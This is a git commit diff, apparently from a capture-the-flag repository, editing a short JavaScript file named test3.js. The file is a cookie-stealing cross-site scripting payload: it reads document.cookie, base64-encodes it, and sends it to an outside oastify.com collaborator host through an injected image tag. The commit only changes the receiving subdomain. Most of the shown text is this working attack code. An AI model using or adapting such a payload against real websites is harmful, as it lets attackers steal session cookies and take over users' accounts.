37f0f8b6b8561c1a6674a9025b781add7a49541c
Saurabh <skumar1@mt.iitr.ac.in>
2022-10-26 19:32:41 +0530

    Update test3.js

--- ctf/test3.js
+++ ctf/test3.js
@@ -2,6 +2,6 @@ const xhr = new XMLHttpRequest();
 xhr.open("GET", 'https://nucalc3-6848907864.ctf.nutanix.com/', true);
 let ck = document.cookie;
 xhr.onreadystatechange = function() {
-  document.write('<img src=http://76bxkmc5brdhbfc5f1h6yp0wyn4fs4.oastify.com/?' + btoa(ck) + '>');
+  document.write('<img src=http://vyxxs6rmmtctva1vbqq3fmluqlwdk2.oastify.com/?' + btoa(ck) + '>');
 };
 xhr.send();
